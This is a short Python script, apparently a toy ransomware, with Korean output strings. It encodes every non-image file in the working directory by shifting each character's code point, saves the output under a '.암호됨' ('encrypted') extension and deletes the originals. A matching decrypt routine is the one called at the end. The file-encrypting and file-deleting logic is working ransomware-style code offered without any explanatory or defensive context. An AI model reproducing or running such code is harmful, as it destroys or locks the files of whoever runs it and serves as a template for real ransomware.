import os
import sys

path = os.getcwd()
filelist = os.listdir(path)

def encode(data):
    encryptData = ''
    for i in range(len(data)):
        encryptData += chr(ord(data[i]) << 2)+'<-[262L<-[*'
    return encryptData

def decode(data):
    decryptData = ''
    filterData = data.split('<-[262L<-[*')
    filterData = [i for i in filterData if i not in {'<-[262L<-[*'}]
    filterData = ''.join(filterData)
    
    for i in range(len(filterData)):
        decryptData += chr(ord(filterData[i]) >> 2)
    return decryptData

def replaceEncrypt(name, text):
    file = open(name+'.암호됨', 'w', encoding='UTF8')
    file.write(text)
    file.close()

def replaceDecrypt(name, text):
    file = open(name.replace('.암호됨', ''), 'w', encoding='UTF-8')
    file.write(text)
    file.close()

def encrypt():
    img = [r".jpg",r".png",r".jpeg"]
    for i in filelist:
        a = os.path.splitext(i)
        if i == os.path.basename(sys.argv[0]) or a[len(a) - 1] in img:
            continue

        filedata = open(i , 'r', encoding='UTF8').read()
        print('파일이름 : ' + i)
        replaceEncrypt(i, encode(filedata))
        print('= ' * 20)
        os.remove(i)

def decrypt():
    encodefile = [file for file in filelist if file.endswith(r'.암호됨')]

    for i in encodefile:
        file = open(i, 'r', encoding='UTF-8').read()
        replaceDecrypt(i, decode(file))
        os.remove(i)
       

decrypt()
